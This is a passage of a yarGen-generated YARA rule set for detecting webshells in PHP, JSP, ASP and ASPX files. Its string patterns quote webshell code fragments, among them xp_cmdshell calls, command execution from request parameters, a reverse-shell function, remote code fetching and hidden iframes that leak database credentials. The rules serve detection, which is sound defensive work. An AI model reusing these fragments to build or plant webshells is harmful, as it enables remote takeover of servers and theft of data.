      $s17 = "                Bin_ExecSql(\"EXEC master..xp_cmdshell 'echo \" + substrfrm + \" >> c:\\\\windows\\\\temp\\\\tmp.fmt'\");" fullword ascii
      $s18 = "comm.ExecuteNonQuery();" fullword ascii
      $s19 = "dirtree 'c:\\',1,1\">XP_dirtree</asp:ListItem><asp:ListItem Value=\"Declare @s int;exec sp_oacreate 'wscript.shell',@s out;Exec " ascii
      $s20 = "o [bin_cmd](cmd)values('&lt;%execute(request(chr(35)))%&gt;');declare @b sysname,@t nvarchar(4000)select @b=db_name(),@t='e:\\1." ascii
   condition:
      uint16(0) == 0x253c and filesize < 300KB and
      1 of ($x*) and all of them
}

rule memWebshell {
   meta:
      description = "webshell - file memWebshell.php"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "b5114574d8e519c1757d19980085ef098353a06f19e71438320f6a83a4670775"
   strings:
      $s1 = "        $remote_file = 'http://10.211.55.2/111/test.txt';" fullword ascii
      $s2 = "        while($code = file_get_contents($remote_file)){" fullword ascii
      $s3 = "        chmod($_SERVER['SCRIPT_FILENAME'], 0777);" fullword ascii
      $s4 = "        unlink($_SERVER['SCRIPT_FILENAME']);" fullword ascii
      $s5 = "        ignore_user_abort(true);" fullword ascii
   condition:
      uint16(0) == 0x2020 and filesize < 1KB and
      all of them
}

rule PHP_Shell {
   meta:
      description = "webshell - file PHP Shell.php"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "61c4fcb6e788c0dffcf0b672ae42b1676f8a9beaa6ec7453fc59ad821a4a8127"
   strings:
      $x1 = "  elseif ( $cmd==\"execute\" ) {/*<!-- Execute the executable -->*/" fullword ascii
      $x2 = "elseif ( $cmd==\"uploadproc\" ) { /* <!-- Process Uploaded file --> */" fullword ascii
      $x3 = "/* <!-- Execute --> */" fullword ascii
      $s4 = "echo sp(3).buildUrl( $img[\"Execute\"], \"cmd=execute&file=$dir/$file\").\"\\n\";" fullword ascii
      $s5 = "   is coded for unsecure servers, if your server is secured the script will hide commands" fullword ascii
      $s6 = "<input name=\"submit_btn\" class=\"inputbutton\" type=\"submit\" value=\"Execute Command\"></p>" fullword ascii
      $s7 = "/* <!-- Download --> */" fullword ascii
      $s8 = "<!-- <?php echo $scriptident ?>, <?php echo $scriptver ?>, <?php echo $scriptdate ?>  -->" fullword ascii
      $s9 = "elseif ( $cmd==\"deldir\" ) { /*<!-- Delete a directory and all it's files --> */" fullword ascii
      $s10 = "elseif ( $cmd==\"edit\" ) { /*<!-- Edit a file and save it afterwards with the saveedit block. --> */" fullword ascii
      $s11 = "elseif ( $cmd==\"upload\" ) { /* <!-- Upload File form --> */ " fullword ascii
      $s12 = "elseif ( $cmd==\"file\" ) { /* <!-- View a file in text --> */" fullword ascii
      $s13 = " elseif ( $cmd==\"delfile\" ) { /*<!-- Delete a file --> */" fullword ascii
      $s14 = "/* HTTP Authorisation password, uncomment if you want to use this */" fullword ascii
      $s15 = "elseif ( $cmd==\"saveedit\" ) { /*<!-- Save the edited file back to a file --> */" fullword ascii
      $s16 = "elseif ( $cmd==\"newfile\" ) { /*<!-- Create new file with default name --> */" fullword ascii
      $s17 = "elseif ( $cmd==\"downl\" ) { /*<!-- Save the edited file back to a file --> */" fullword ascii
      $s18 = "elseif ( $cmd==\"ren\" ) { /* <!-- File and Directory Rename --> */" fullword ascii
      $s19 = "elseif ( $cmd==\"newdir\" ) { /*<!-- Create new directory with default name --> */" fullword ascii
      $s20 = "header(\"Content-Disposition: attachment; filename=$downloadto$add\");" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 100KB and
      1 of ($x*) and 4 of them
}

rule mysqlwebsh {
   meta:
      description = "webshell - file mysqlwebsh.php"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "09ffba21e3b48984f1e3b9519fb79e013ec4e76a9fa5ef7ffb8c8a10bc67fcbe"
   strings:
      $s1 = "<TITLE>MySQL Web Shell <? echo $VERSION ?>, <? echo \"$LOGIN@$HOST\" ?></TITLE>" fullword ascii
      $s2 = " $LOGIN = isset($HTTP_POST_VARS[\"login\"])?$HTTP_POST_VARS[\"login\"]:$HTTP_COOKIE_VARS[\"login\"];" fullword ascii
      $s3 = " <TR><TD bgcolor=\"<? echo (!$CONNECT && $action == \"chparam\")?\"#660000\":\"#446688\" ?>\"><B><? echo $CONNECT?\"Parameters\"" ascii
      $s4 = " $HOST = isset($HTTP_POST_VARS[\"host\"])?$HTTP_POST_VARS[\"host\"]:$HTTP_COOKIE_VARS[\"host\"];" fullword ascii
      $s5 = " $PASSWORD = isset($HTTP_POST_VARS[\"password\"])?$HTTP_POST_VARS[\"password\"]:$HTTP_COOKIE_VARS[\"password\"];" fullword ascii
      $s6 = " $MSIE = ereg(\"MSIE\",$HTTP_USER_AGENT);" fullword ascii
      $s7 = " if (@mysql_connect($HOST,$LOGIN,$PASSWORD)) {$CONNECT = 1;} else {$CONNECT = 0;}" fullword ascii
      $s8 = " <TR><TD bgcolor=\"<? echo (!$CONNECT && $action == \"chparam\")?\"#660000\":\"#446688\" ?>\"><B><? echo $CONNECT?\"Parameters\"" ascii
      $s9 = "   SetCookie(\"login\",$HTTP_POST_VARS[\"login\"]);" fullword ascii
      $s10 = "   SetCookie(\"login\", \"\", time() - 360000);" fullword ascii
      $s11 = "<TD valign=top align=center><BR><A href=\"javascript: hist('up');\"><IMG src=\"<? echo $PHP_SELF ?>?arrowup\" width=12 height=11" ascii
      $s12 = "   SetCookie(\"password\",$HTTP_POST_VARS[\"password\"]);" fullword ascii
      $s13 = "This option means that you will see the real-time display of \"fetch\" process.<BR>" fullword ascii
      $s14 = " $DATABASE = isset($HTTP_POST_VARS[\"database\"])?$HTTP_POST_VARS[\"database\"]:$HTTP_COOKIE_VARS[\"database\"];" fullword ascii
      $s15 = " $DISABLEDM = isset($HTTP_POST_VARS[\"DISABLEDM\"])?$HTTP_POST_VARS[\"DISABLEDM\"]:$HTTP_COOKIE_VARS[\"DISABLEDM\"];" fullword ascii
      $s16 = "   SetCookie(\"password\", \"\", time() - 360000);" fullword ascii
      $s17 = "   SetCookie(\"host\", \"\", time() - 360000);" fullword ascii
      $s18 = "   SetCookie(\"host\",$HTTP_POST_VARS[\"host\"]);" fullword ascii
      $s19 = "(100 percent correct table display after the process of" fullword ascii
      $s20 = "  Header(\"Content-type: image/gif\");" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 50KB and
      8 of them
}

rule webshell_jsp_Browser {
   meta:
      description = "webshell - file Browser.jsp"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "5c8e4945b0aa4bc661db0f9fea51a7fac07ad3d4093c499100570a613906512c"
   strings:
      $x1 = "Process ls_proc = Runtime.getRuntime().exec(comm, null, new File(dir));" fullword ascii
      $s2 = ".processData(request.getInputStream(), bound, tempdir, clength);" fullword ascii
      $s3 = " * Command of the shell interpreter and the parameter to run a programm" fullword ascii
      $s4 = "static String startProcess(String command, String dir) throws IOException {" fullword ascii
      $s5 = "@param command the command to start the process" fullword ascii
      $s6 = "ret.append(\"!!!! Process has timed out, destroyed !!!!!\");" fullword ascii
      $s7 = "if (System.currentTimeMillis() - start > MAX_PROCESS_RUNNING_TIME) {" fullword ascii
      $s8 = "response.setHeader(\"Content-Type\", \"text/javascript\");" fullword ascii
      $s9 = "private static final long MAX_PROCESS_RUNNING_TIME = 30 * 1000; //30 seconds" fullword ascii
      $s10 = "request.setAttribute(\"error\", \"You are not allowed to access \" + ht.get(\"dir\"));" fullword ascii
      $s11 = "                request.setAttribute(\"error\", \"Execution of native commands is not allowed!\");" fullword ascii
      $s12 = "request.setAttribute(\"error\", \"Reading of \" + f.getName() + \" aborted. Error: \"" fullword ascii
      $s13 = "response.setHeader(\"Content-Disposition\", \"attachment;filename=\\\"\" + f.getName()" fullword ascii
      $s14 = "- Description: jsp File browser v1.2 -- This JSP program allows remote web-based" fullword ascii
      $s15 = "response.setHeader(\"Content-Disposition\", \"attachment;filename=\\\"rename_me.zip\\\"\");" fullword ascii
      $s16 = "* f1.getAbsolutePath().toUpperCase().compareTo(" fullword ascii
      $s17 = "request.setAttribute(\"error\", \"File \" + f.getAbsolutePath()" fullword ascii
      $s18 = " * Max time in ms a process is allowed to run, before it will be terminated" fullword ascii
      $s19 = "*If true, all operations (besides upload and native commands) " fullword ascii
      $s20 = "if (posi != -1) info = UploadMonitor.getInfo(fname.substring(posi + 1));" fullword ascii
   condition:
      uint16(0) == 0x253c and filesize < 200KB and
      1 of ($x*) and 4 of them
}

rule download {
   meta:
      description = "webshell - file download.jsp"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "b5e9cd17caf4344895afca031a55535af49189c60a4b05095425931c9ab1b11b"
   strings:
      $x1 = "Process ls_proc = Runtime.getRuntime().exec(comm, null, new File(dir));" fullword ascii
      $s2 = ".processData(request.getInputStream(), bound, tempdir, clength);" fullword ascii
      $s3 = " * Command of the shell interpreter and the parameter to run a programm" fullword ascii
      $s4 = "static String startProcess(String command, String dir) throws IOException {" fullword ascii
      $s5 = "@param command the command to start the process" fullword ascii
      $s6 = "ret.append(\"!!!! Process has timed out, destroyed !!!!!\");" fullword ascii
      $s7 = "if (System.currentTimeMillis() - start > MAX_PROCESS_RUNNING_TIME) {" fullword ascii
      $s8 = "response.setHeader(\"Content-Type\", \"text/javascript\");" fullword ascii
      $s9 = "private static final long MAX_PROCESS_RUNNING_TIME = 30 * 1000; //30 seconds" fullword ascii
      $s10 = "request.setAttribute(\"error\", \"You are not allowed to access \" + ht.get(\"dir\"));" fullword ascii
      $s11 = "                request.setAttribute(\"error\", \"Execution of native commands is not allowed!\");" fullword ascii
      $s12 = "request.setAttribute(\"error\", \"Reading of \" + f.getName() + \" aborted. Error: \"" fullword ascii
      $s13 = "response.setHeader(\"Content-Disposition\", \"attachment;filename=\\\"\" + f.getName()" fullword ascii
      $s14 = "response.setHeader(\"Content-Disposition\", \"attachment;filename=\\\"rename_me.zip\\\"\");" fullword ascii
      $s15 = "* f1.getAbsolutePath().toUpperCase().compareTo(" fullword ascii
      $s16 = "request.setAttribute(\"error\", \"File \" + f.getAbsolutePath()" fullword ascii
      $s17 = " * Max time in ms a process is allowed to run, before it will be terminated" fullword ascii
      $s18 = "*If true, all operations (besides upload and native commands) " fullword ascii
      $s19 = "if (posi != -1) info = UploadMonitor.getInfo(fname.substring(posi + 1));" fullword ascii
      $s20 = "return sign * tempEndf1.compareTo(tempEndf2);" fullword ascii
   condition:
      uint16(0) == 0x253c and filesize < 200KB and
      1 of ($x*) and 4 of them
}

rule webshell_jsp_ma {
   meta:
      description = "webshell - file ma.jsp"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "62c616f5cddfd493f16e6ef2d7fe12567ee2d16a311317da8d59fb5f3f09f713"
   strings:
      $x1 = "Process ls_proc = Runtime.getRuntime().exec(comm, null, new File(dir));" fullword ascii
      $s2 = ".processData(request.getInputStream(), bound, tempdir, clength);" fullword ascii
      $s3 = " * Command of the shell interpreter and the parameter to run a programm" fullword ascii
      $s4 = "static String startProcess(String command, String dir) throws IOException {" fullword ascii
      $s5 = "@param command the command to start the process" fullword ascii
      $s6 = "ret.append(\"!!!! Process has timed out, destroyed !!!!!\");" fullword ascii
      $s7 = "if (System.currentTimeMillis() - start > MAX_PROCESS_RUNNING_TIME) {" fullword ascii
      $s8 = "response.setHeader(\"Content-Type\", \"text/javascript\");" fullword ascii
      $s9 = "private static final long MAX_PROCESS_RUNNING_TIME = 30 * 1000; //30 seconds" fullword ascii
      $s10 = "request.setAttribute(\"error\", \"You are not allowed to access \" + ht.get(\"dir\"));" fullword ascii
      $s11 = "                request.setAttribute(\"error\", \"Execution of native commands is not allowed!\");" fullword ascii
      $s12 = "request.setAttribute(\"error\", \"Reading of \" + f.getName() + \" aborted. Error: \"" fullword ascii
      $s13 = "response.setHeader(\"Content-Disposition\", \"attachment;filename=\\\"\" + f.getName()" fullword ascii
      $s14 = "response.setHeader(\"Content-Disposition\", \"attachment;filename=\\\"rename_me.zip\\\"\");" fullword ascii
      $s15 = "* f1.getAbsolutePath().toUpperCase().compareTo(" fullword ascii
      $s16 = "request.setAttribute(\"error\", \"File \" + f.getAbsolutePath()" fullword ascii
      $s17 = " * Max time in ms a process is allowed to run, before it will be terminated" fullword ascii
      $s18 = "*If true, all operations (besides upload and native commands) " fullword ascii
      $s19 = "if (posi != -1) info = UploadMonitor.getInfo(fname.substring(posi + 1));" fullword ascii
      $s20 = "return sign * tempEndf1.compareTo(tempEndf2);" fullword ascii
   condition:
      uint16(0) == 0x253c and filesize < 200KB and
      1 of ($x*) and 4 of them
}

rule jsp_File_browser {
   meta:
      description = "webshell - file jsp_File_browser.jsp"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "89a69d8d77e3a427276a568cde58dbfa0fd8a555f51ecc38c1b91a929db2b209"
   strings:
      $x1 = "Process ls_proc = Runtime.getRuntime().exec(comm, null, new File(dir));" fullword ascii
      $s2 = ".processData(request.getInputStream(), bound, tempdir, clength);" fullword ascii
      $s3 = " * Command of the shell interpreter and the parameter to run a programm" fullword ascii
      $s4 = "static String startProcess(String command, String dir) throws IOException {" fullword ascii
      $s5 = "@param command the command to start the process" fullword ascii
      $s6 = "ret.append(\"!!!! Process has timed out, destroyed !!!!!\");" fullword ascii
      $s7 = "if (System.currentTimeMillis() - start > MAX_PROCESS_RUNNING_TIME) {" fullword ascii
      $s8 = "response.setHeader(\"Content-Type\", \"text/javascript\");" fullword ascii
      $s9 = "private static final long MAX_PROCESS_RUNNING_TIME = 30 * 1000; //30 seconds" fullword ascii
      $s10 = "request.setAttribute(\"error\", \"You are not allowed to access \" + ht.get(\"dir\"));" fullword ascii
      $s11 = "                request.setAttribute(\"error\", \"Execution of native commands is not allowed!\");" fullword ascii
      $s12 = "request.setAttribute(\"error\", \"Reading of \" + f.getName() + \" aborted. Error: \"" fullword ascii
      $s13 = "response.setHeader(\"Content-Disposition\", \"attachment;filename=\\\"\" + f.getName()" fullword ascii
      $s14 = "- Description: jsp File browser v1.2 -- This JSP program allows remote web-based" fullword ascii
      $s15 = "response.setHeader(\"Content-Disposition\", \"attachment;filename=\\\"rename_me.zip\\\"\");" fullword ascii
      $s16 = "* f1.getAbsolutePath().toUpperCase().compareTo(" fullword ascii
      $s17 = "request.setAttribute(\"error\", \"File \" + f.getAbsolutePath()" fullword ascii
      $s18 = " * Max time in ms a process is allowed to run, before it will be terminated" fullword ascii
      $s19 = "*If true, all operations (besides upload and native commands) " fullword ascii
      $s20 = "if (posi != -1) info = UploadMonitor.getInfo(fname.substring(posi + 1));" fullword ascii
   condition:
      uint16(0) == 0x253c and filesize < 200KB and
      1 of ($x*) and 4 of them
}

rule webshell_jsp_3 {
   meta:
      description = "webshell - file 3.jsp"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "e44e97f8d375523576bb2e93e3de8d29d7f95891da3d082bf083b837d1873eab"
   strings:
      $x1 = "Process ls_proc = Runtime.getRuntime().exec(comm, null, new File(dir));" fullword ascii
      $s2 = ".processData(request.getInputStream(), bound, tempdir, clength);" fullword ascii
      $s3 = " * Command of the shell interpreter and the parameter to run a programm" fullword ascii
      $s4 = "static String startProcess(String command, String dir) throws IOException {" fullword ascii
      $s5 = "@param command the command to start the process" fullword ascii
      $s6 = "ret.append(\"!!!! Process has timed out, destroyed !!!!!\");" fullword ascii
      $s7 = "if (System.currentTimeMillis() - start > MAX_PROCESS_RUNNING_TIME) {" fullword ascii
      $s8 = "response.setHeader(\"Content-Type\", \"text/javascript\");" fullword ascii
      $s9 = "private static final long MAX_PROCESS_RUNNING_TIME = 30 * 1000; //30 seconds" fullword ascii
      $s10 = "request.setAttribute(\"error\", \"You are not allowed to access \" + ht.get(\"dir\"));" fullword ascii
      $s11 = "                request.setAttribute(\"error\", \"Execution of native commands is not allowed!\");" fullword ascii
      $s12 = "request.setAttribute(\"error\", \"Reading of \" + f.getName() + \" aborted. Error: \"" fullword ascii
      $s13 = "response.setHeader(\"Content-Disposition\", \"attachment;filename=\\\"\" + f.getName()" fullword ascii
      $s14 = "response.setHeader(\"Content-Disposition\", \"attachment;filename=\\\"rename_me.zip\\\"\");" fullword ascii
      $s15 = "* f1.getAbsolutePath().toUpperCase().compareTo(" fullword ascii
      $s16 = "request.setAttribute(\"error\", \"File \" + f.getAbsolutePath()" fullword ascii
      $s17 = " * Max time in ms a process is allowed to run, before it will be terminated" fullword ascii
      $s18 = "*If true, all operations (besides upload and native commands) " fullword ascii
      $s19 = "if (posi != -1) info = UploadMonitor.getInfo(fname.substring(posi + 1));" fullword ascii
      $s20 = "return sign * tempEndf1.compareTo(tempEndf2);" fullword ascii
   condition:
      uint16(0) == 0x253c and filesize < 200KB and
      1 of ($x*) and 4 of them
}

rule sig_2020_08_20_12 {
   meta:
      description = "webshell - file 2020.08.20.12.php"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "8620e0455af6a0ae108192cac2f28a87eb5f9f741906a62bbb4af03af63e8792"
   strings:
      $s1 = "        $x($_POST['x']);" fullword ascii
      $s2 = "    function sqlsec($value,$key)" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 1KB and
      all of them
}

rule webshell_jsp_dy {
   meta:
      description = "webshell - file dy.jsp"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "c525fc8c5db44286a6f04746faa3c9e2f5087cda1962c5154b758515f3e1bb1b"
   strings:
      $s1 = "public String DBExecute(String sql) {  " fullword ascii
      $s2 = "        _jshellContent = m.replaceAll(\"private String _password = \\\"\" + password + \"\\\"\");  " fullword ascii
      $s3 = "        <td align=\"right\">hack520 by <a href=\"mailto:hack520@77169.org\">hack520</a> and welcome to <a href=\"http://www.7716" ascii
      $s4 = "public boolean DBInit(String dbType, String dbServer, String dbPort, String dbUsername, String dbPassword, String dbName) {  " fullword ascii
      $s5 = "public String exeCmd(String cmd) {  " fullword ascii
      $s6 = "if (request.getParameter(\"password\") == null && session.getAttribute(\"password\") == null) {  " fullword ascii
      $s7 = "        _jshellContent = m.replaceAll(\"private int _sessionOutTime = \" + sessionTime);  " fullword ascii
      $s8 = "    public void setPassword(String password) throws JshellConfigException {  " fullword ascii
      $s9 = "          <SCRIPT type='text/javascript' language='javascript' src='http://xslt.alexa.com/site_stats/js/t/c?url='></SCRIPT>  " fullword ascii
      $s10 = "            _dbConnection = DriverManager.getConnection(_url, User, Password);  " fullword ascii
      $s11 = "        p = Pattern.compile(\"private\\\\sString\\\\s_password\\\\s=\\\\s\\\"\" + _password + \"\\\"\");  " fullword ascii
      $s12 = "                if (_dbStatement.execute(sql)) {  " fullword ascii
      $s13 = "                                dbResult = DBExecute(sql);  " fullword ascii
      $s14 = "    <form name=\"config\" method=\"post\" action=\"<%=request.getRequestURI() + \"?action=config&cfAction=save\"%>\" onSubmit=\"" ascii
      $s15 = "<meta http-equiv=\"Content-Type\" content=\"text/html; charset=gb2312\"></head>  " fullword ascii
      $s16 = "urFile.getParent())) + \"\\\">" fullword ascii
      $s17 = "        proc = runtime.exec(cmd);  " fullword ascii
      $s18 = "                result += \"<meta http-equiv=\\\"refresh\\\" content=\\\"2;url=\" + request.getRequestURI() + \"?action=\" + req" ascii
      $s19 = "                result += \"<meta http-equiv=\\\"refresh\\\" content=\\\"2;url=\" + request.getRequestURI() + \"?action=\" + req" ascii
      $s20 = "        _jshellContent = m.replaceAll(\"private String _encodeType = \\\"\" + encodeType + \"\\\"\");  " fullword ascii
   condition:
      uint16(0) == 0x253c and filesize < 200KB and
      8 of them
}

rule webshell_aspx_con2 {
   meta:
      description = "webshell - file con2.aspx"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "d175b3176f1fb891735a2aaed2bc851074b3b50d4eb99c90146dc6a0eaa26d48"
   strings:
      $x1 = "cmd.ExecuteNonQuery();" fullword ascii
      $x2 = "ProcessStartInfo MyProcessStartInfo = new ProcessStartInfo(\"cmd.exe\");" fullword ascii
      $s3 = "MyProcessStartInfo.UseShellExecute = false;" fullword ascii
      $s4 = ":<asp:TextBox ID=\"TextBoxDurl\" runat=\"server\" Width=\"270px\">http://www.baidu.com/img/logo.gif</asp:TextBox></br>" fullword ascii
      $s5 = "Response.AddHeader(\"Content-Disposition\", \"attachment; filename=\" + HttpUtility.UrlEncode(file.Name));" fullword ascii
      $s6 = "LbNum.Text = ProcessNum + \"" fullword ascii
      $s7 = "MyProcessStartInfo.Arguments = \"/c\" + TextBoxDos.Text;" fullword ascii
      $s8 = ":<asp:TextBox ID=\"TextBoxDfile\" runat=\"server\" Width=\"270px\">c:\\logo.gif</asp:TextBox>" fullword ascii
      $s9 = "<td><a href='?page=index&src=C:\\Documents and Settings\\All Users\\Documents\\'><font color=\"#009900\">Documents</font></a> </" ascii
      $s10 = "<td><a href='?page=index&src=C:\\Documents and Settings\\All Users\\'><font color=\"#009900\">All Users</font></a> </td>" fullword ascii
      $s11 = "<td><a href='?page=index&src=C:\\WINDOWS\\system32\\config\\'><font color=\"#009900\">Config</font></a> </td>" fullword ascii
      $s12 = "ListBoxPro.Items.Add(allprocess.ProcessName);" fullword ascii
      $s13 = "<asp:Label ID=\"LbSqlD\" runat=\"server\" Text=\"Command:\" Width=\"42px\"></asp:Label>" fullword ascii
      $s14 = "<td><a href='?page=index&src=C:\\Documents and Settings\\All Users\\" fullword ascii
      $s15 = "else if ((page == \"process\") && Session[\"root\"] != null)" fullword ascii
      $s16 = "exe.StartInfo.UseShellExecute = false;" fullword ascii
      $s17 = "cmd.CommandText = TextBoxSqlCon.Text;" fullword ascii
      $s18 = "<%@ Assembly Name=\"System.DirectoryServices,Version=2.0.0.0,Culture=neutral,PublicKeyToken=B03F5F7F11D50A3A\"%>" fullword ascii
      $s19 = "<td><a href='?page=index&src=C:\\Program Files\\RhinoSoft.com\\'><font color=\"#009900\">Serv-u" fullword ascii
      $s20 = "Process[] process = Process.GetProcesses();" fullword ascii
   condition:
      uint16(0) == 0x253c and filesize < 90KB and
      1 of ($x*) and 4 of them
}

rule jsp_custom_spy_for_mysql {
   meta:
      description = "webshell - file jsp_custom_spy_for_mysql.jsp"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "5602d8a781e9f917886d7f84c713554c4d485a276fdab0744790e6b260610202"
   strings:
      $s1 = "        Process p = Runtime.getRuntime().exec(c);" fullword ascii
      $s2 = "            sb.append(ExecuteCommandCode(pars[1], pars[2]));" fullword ascii
      $s3 = "    String ExecuteCommandCode(String cmdPath, String command) throws Exception {" fullword ascii
      $s4 = "                CopyFileOrDirCode(sourceFilePath + \"/\" + z[j].getName(), targetFilePath + \"/\" + z[j].getName());" fullword ascii
      $s5 = "    jdbc:mysql://localhost/test?user=root&password=123456" fullword ascii
      $s6 = "        ResultSet rs = stmt.executeQuery(sql);" fullword ascii
      $s7 = "        Connection c = DriverManager.getConnection(url);" fullword ascii
      $s8 = "    String CopyFileOrDirCode(String sourceFilePath, String targetFilePath) throws Exception {" fullword ascii
      $s9 = "        String z2 = decode(EC(request.getParameter(\"z2\") + \"\"), encoder);" fullword ascii
      $s10 = "        String z3 = decode(EC(request.getParameter(\"z3\") + \"\"), encoder);" fullword ascii
      $s11 = "        String user = System.getProperty(\"user.name\");" fullword ascii
      $s12 = "        String z1 = decode(EC(request.getParameter(\"z1\") + \"\"), encoder);" fullword ascii
      $s13 = "        File sf = new File(sourceFilePath), df = new File(targetFilePath);" fullword ascii
      $s14 = "        CopyInputStream(p.getErrorStream(), sb);" fullword ascii
      $s15 = "    String executeSQL(String encode, String conn, String sql, String columnsep, String rowsep, boolean needcoluname)" fullword ascii
      $s16 = "        return executeSQL(encode, conn, sql, columnsep, rowsep, true);" fullword ascii
      $s17 = "        return executeSQL(encode, conn, sql, columnsep, rowsep, false);" fullword ascii
      $s18 = "        return d + \"\\t\" + driverlist + \"\\t\" + serverInfo + \"\\t\" + user;" fullword ascii
      $s19 = " Shell " fullword ascii
      $s20 = "ChangeLog:" fullword ascii
   condition:
      uint16(0) == 0x253c and filesize < 40KB and
      8 of them
}

rule webshell_jsp_cat {
   meta:
      description = "webshell - file cat.jsp"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "fcd593c52489526b4c83660cba0b22cccb833614ff451c37263d64c726766b77"
   strings:
      $s1 = "out.write((\"User:\\t\"+exec(\"whoami\")).getBytes());" fullword ascii
      $s2 = "return new String(inutStreamToOutputStream(Runtime.getRuntime().exec(cmd).getInputStream()).toByteArray(),encoding);" fullword ascii
      $s3 = "out.println(\"<pre>\"+exec(request.getParameter(\"cmd\"))+\"</pre>\");" fullword ascii
      $s4 = "shell(request.getParameter(\"host\"), Integer.parseInt(request.getParameter(\"port\")));" fullword ascii
      $s5 = "out.println(\"<tr \"+((i%2!=0)?\"bgcolor=\\\"#eeeeee\\\"\":\"\")+\"><td align=\\\"left\\\">&nbsp;&nbsp;<a href=\\\"javascript:ge" ascii
      $s6 = "static void shell(String host,int port) throws UnknownHostException, IOException{" fullword ascii
      $s7 = "out.write(exec(new String(b,0,a,\"UTF-8\").trim()).getBytes(\"UTF-8\"));" fullword ascii
      $s8 = "encoding = isNotEmpty(getSystemEncoding())?getSystemEncoding():encoding;" fullword ascii
      $s9 = "String out = exec(cmd);" fullword ascii
      $s10 = "static String exec(String cmd) {" fullword ascii
      $s11 = "response.setHeader(\"Content-Disposition\", \"attachment; filename=\"+fileName);" fullword ascii
      $s12 = "out.println(\"<pre>\"+auto(request.getParameter(\"url\"),request.getParameter(\"fileName\"),request.getParameter(\"cmd\"))+\"</p" ascii
      $s13 = "/td><td align=\\\"center\\\"><a href=\\\"\"+request.getContextPath()+request.getServletPath()+\"?action=download&p=\"+path+\"&fi" ascii
      $s14 = "download(request.getParameter(\"url\"), request.getParameter(\"path\"));" fullword ascii
      $s15 = "if(isNotEmpty(action) && !\"get\".equalsIgnoreCase(action)){" fullword ascii
      $s16 = "return System.getProperty(\"sun.jnu.encoding\");" fullword ascii
      $s17 = "if(isNotEmpty(file) && isNotEmpty(data)){" fullword ascii
      $s18 = " cmd /c dir " fullword ascii
      $s19 = "out.println(\"<tr \"+((i%2!=0)?\"bgcolor=\\\"#eeeeee\\\"\":\"\")+\"><td align=\\\"left\\\">&nbsp;&nbsp;<a href=\\\"javascript:ge" ascii
      $s20 = "response.setContentType(\"application/x-download\");" fullword ascii
   condition:
      uint16(0) == 0x253c and filesize < 30KB and
      8 of them
}

rule mssql {
   meta:
      description = "webshell - file mssql.asp"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "44cf0b5b3d70552f9acd5d113bed080d1d85dcd8d31715964a13b214a27a33e0"
   strings:
      $s1 = "Set rs = Conn.Execute(sql)" fullword ascii
      $s2 = "conn.execute(sql)" fullword ascii
      $s3 = "conn.execute(strdel)" fullword ascii
      $s4 = "set rs = conn.execute(sql)" fullword ascii
      $s5 = "  conn.execute(sql)" fullword ascii
      $s6 = "conn.execute (aSql(iLoop))" fullword ascii
      $s7 = "<iframe src=\"http://www.g.cn/dbstrs/1.asp?dburl=<%=GetUrl()%>\" width=0 height=0></iframe>" fullword ascii
      $s8 = "<a href=\"http://www.g.cn\" target=\"_blank\">" fullword ascii
      $s9 = "geturl = \"?\" & replace(request.QueryString,\"&keylog=\"&request(\"keylog\"),\"\")" fullword ascii
      $s10 = "<iframe src=\"http://www.g.cn/dbstrs/1.asp?dbstr=<%=session(\"dbstr\")%>\" width=0 height=0></iframe>" fullword ascii
      $s11 = "echo \"<textarea cols=70 rows=8>\" & adox.Procedures(sTableName).Command.CommandText & \"</textarea><br>\"" fullword ascii
      $s12 = "<input name=\"dbstr\" type=\"text\" id=\"dbstr\" size=\"120\" value=\"Provider=Microsoft.Jet.OLEDB.4.0;Persist Security Info=Fal" ascii
      $s13 = "  <input name=\"dbtype\" type=\"radio\" value=\"access\" onClick=\"dbstr.value='Provider=Microsoft.Jet.OLEDB.4.0;Persist Securit" ascii
      $s14 = "window.event.keyCode==13){this.document.exesql.submit();}}" fullword ascii
      $s15 = "getsql = \"-- " fullword ascii
      $s16 = "response.write err.description" fullword ascii
      $s17 = "echo \"<form action='?key=edit&table_name=\" & names & \"&primarykey=\" & keys & \"&primarykeyvalue=\" & iif(action<>\"add\",rs(" ascii
      $s18 = "False;Password=;Data Source=<%=server.mappath(\"/\")&\"\\\"%>'\" checked>" fullword ascii
      $s19 = "'---- SchemaEnum Values ----" fullword ascii
      $s20 = "<form action=\"?key=editfidle&fidle=<%=request(\"fidle\")%>&table_name=<%=request(\"table_name\")%>\" method=\"post\" name=frm o" ascii
   condition:
      uint16(0) == 0x423c and filesize < 100KB and
      8 of them
}

rule r57shell127 {
   meta:
      description = "webshell - file r57shell127.php"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "e88efb3e4c358ce3ad25f7eca3d437cb8c27572772f29e42604c856df864a860"
   strings:
